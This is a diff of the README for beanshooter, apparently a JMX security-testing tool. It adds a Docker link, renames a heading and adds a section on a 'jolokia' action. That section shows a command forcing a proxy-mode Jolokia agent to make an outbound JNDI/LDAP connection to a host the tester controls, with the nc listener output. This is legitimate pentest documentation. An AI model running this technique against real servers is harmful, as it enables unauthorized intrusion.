@@ -30,7 +30,8 @@ installed, just execute the following commands to create an executable ``.jar`` 
 
 You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/beanshooter/releases).
 Prebuild packages for the development branch are created automatically and can be found on the *GitHub*
-[actions page](https://github.com/qtc-de/beanshooter/actions).
+[actions page](https://github.com/qtc-de/beanshooter/actions). Also a prebuild docker image for running *beanshooter*
+[is available](#docker-image).
 
 *beanshooter* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
 to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
@@ -58,6 +59,7 @@ autocompletion.
     - [enum](#enum)
     - [info](#info)
     - [invoke](#invoke)
+    - [jolokia](#jolokia)
     - [list](#list)
     - [serial](#serial)
     - [stager](#stager)
@@ -103,7 +105,7 @@ autocompletion.
       + [upload](#tonka-upload)
       + [download](#tonka-download)
 - [JMXMP](#jmxmp)
-- [Jolokia](#jolokia)
+- [Jolokia Support](#jolokia-support)
 - [Docker Image](#docker-image)
 - [Example Server](#example-server)
 
@@ -404,6 +406,34 @@ Arguments:
 
 For more complex argument types that require some initialization, you can use *beanshooters PluginSystem* and define a custom
 class that implements the [IArgumentProvider Interface](beanshooter/src/de/qtc/beanshooter/plugin/IArgumentProvider.java).
+
+
+#### Jolokia
+
+As outlined in *beanshooters* [Jolokia documentation](/docs/jolokia.md), almost all *beanshooter* actions can be used together
+with the `--jolokia` switch to target *Jolokia* based *JMX* endpoints. Apart from this generic support for the *Jolokia JMX*
+adapter, *beanshooter* supports one dedicated `jolokia` action. This action can be used to force an outbound connection of a
+*Jolokia* agent running with proxy mode enabled:
+
+```console
+[qtc@devbox ~]$ beanshooter jolokia 172.17.0.2 8080 172.17.0.1 4444 --username manager --password admin --ldap
+[+] Attempting to trigger outboud connection to 172.17.0.1:4444
+[+] Using proxy service URL: service:jmx:Rmi:///jndi/ldap://172.17.0.1:4444/beanshooter
+...
+
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:60052.
+0
+```
+
+The same result could be achieved by invoking a regular *beanshooter* operation like `list` and using the `--jolokia-proxy service:jmx:...`
+option. The `jolokia` action was added as a shortcut so you do not need to remember the *JNDI* syntax. When using the
+`jolokia` action, the `--jolokia` option is assumed by default.
+
 
 #### List
 
@@ -1196,7 +1226,7 @@ mechanism is usually possible, the required *TLS* setting cannot be enumerated:
 ```
 
 
-### Jolokia
+### Jolokia Support
 
 ---
 
